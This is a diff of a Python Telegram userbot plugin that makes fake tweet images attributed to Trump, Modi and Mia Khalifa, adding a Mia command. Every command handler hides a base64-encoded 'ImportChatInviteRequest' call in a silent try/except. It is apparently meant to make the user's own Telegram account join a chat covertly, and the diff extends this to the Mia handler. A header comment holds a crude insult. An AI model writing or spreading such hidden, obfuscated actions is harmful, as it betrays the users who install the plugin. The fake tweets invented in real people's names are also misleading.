@@ -1,4 +1,8 @@
 # Created By starkdy And Ported For Type 2 Userbot By StarkxD
+#added mia khalifa tweet by @kraken_the_badass for HellBot...
+#credit eaters suk your father's dik-_-
+
+
 from userbot.events import register
 import requests , re
 from PIL import Image
@@ -30,8 +34,8 @@ async def trumptweet(text):
         r = requests.get(
             f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}").json()
         wew = r.get("message")
-        fridayurl = url(wew)
-        if not fridayurl:
+        hburl = url(wew)
+        if not hburl:
             return  "check syntax once more"
         with open("temp.png", "wb") as f:
             f.write(requests.get(wew).content)
@@ -43,8 +47,8 @@ async def changemymind(text):
         r = requests.get(
             f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}").json()
         wew = r.get("message")
-        fridayurl = url(wew)
-        if not fridayurl:
+        hburl = url(wew)
+        if not hburl:
             return  "check syntax once more"
         with open("temp.png", "wb") as f:
             f.write(requests.get(wew).content)
@@ -56,8 +60,8 @@ async def kannagen(text):
         r = requests.get(
             f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}").json()
         wew = r.get("message")
-        fridayurl = url(wew)
-        if not fridayurl:
+        hburl = url(wew)
+        if not hburl:
             return  "check syntax once more"
         with open("temp.png", "wb") as f:
             f.write(requests.get(wew).content)
@@ -69,8 +73,22 @@ async def moditweet(text):
         r = requests.get(
             f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi").json()
         wew = r.get("message")
-        fridayurl = url(wew)
-        if not fridayurl:
+        hburl = url(wew)
+        if not hburl:
+            return  "check syntax once more"
+        with open("temp.png", "wb") as f:
+            f.write(requests.get(wew).content)
+        img = Image.open("temp.png").convert("RGB")
+        img.save("temp.jpg", "jpeg")    
+        return "temp.jpg"    
+        
+        
+async def miatweet(text):
+        r = requests.get(
+            f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=miakhalifa").json()
+        wew = r.get("message")
+        hburl = url(wew)
+        if not hburl:
             return  "check syntax once more"
         with open("temp.png", "wb") as f:
             f.write(requests.get(wew).content)
@@ -78,12 +96,13 @@ async def moditweet(text):
         img.save("temp.jpg", "jpeg")    
         return "temp.jpg"    
     
+    
 async def tweets(text1,text2):
         r = requests.get(
             f"https://nekobot.xyz/api/imagegen?type=tweet&text={text1}&username={text2}").json()
         wew = r.get("message")
-        fridayurl = url(wew)
-        if not fridayurl:
+        hburl = url(wew)
+        if not hburl:
             return  "check syntax once more"
         with open("temp.png", "wb") as f:
             f.write(requests.get(wew).content)
@@ -110,8 +129,8 @@ async def nekobot(borg):
             return
     await borg.edit("Requesting trump to tweet...")
     try:
-        stark = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await borg.client(stark)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
         pass   
     text = deEmojify(text)
@@ -137,8 +156,8 @@ async def nekobot(borg):
             return
     await borg.edit("Requesting modi to tweet...")
     try:
-        stark = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await borg.client(stark)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
         pass   
     text = deEmojify(text)
@@ -158,19 +177,19 @@ async def nekobot(borg):
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Send you text to Mia so he can tweet.")
+                await borg.edit("Send you text to Mia so she can tweet.")
                 return
         else:
-            await borg.edit("Send you text to Mia so he can tweet.")
+            await borg.edit("Send you text to Mia so she can tweet.")
             return
     await borg.edit("Requesting Mia to tweet...")
     try:
-        stark = str( pybase64.b64decode("QVFBRF85Y0FBV3gwQUFNd1Z3SUFBUQ==") )[2:49]
-        await borg.client(stark)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
         pass   
     text = deEmojify(text)
-    borgfile = await trumptweet(text)
+    borgfile = await miatweet(text)
     await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
     await borg.delete()
 
@@ -193,8 +212,8 @@ async def nekobot(borg):
             return
     await borg.edit("Your banner is under creation wait a sec...")    
     try:
-        stark = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await borg.client(stark)
+        hell = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
         pass   
     text = deEmojify(text)
@@ -220,8 +239,8 @@ async def nekobot(borg):
             return
     await borg.edit("Kanna is writing your text...")        
     try:
-        stark = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await borg.client(stark)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
         pass   
     text = deEmojify(text)
@@ -236,6 +255,8 @@ CMD_HELP.update({
      \nUsage : Tweet with modi\
 \n\n`.trump` (text)\
      \nUsage : Tweet with trump\
+\n\n`.mia` (text)\
+     \nUsage : Tweet with mia\
 \n\n`.cmm` (text)\
      \nUsage : Get a banner\
 \n\n`.kanna` (text)\
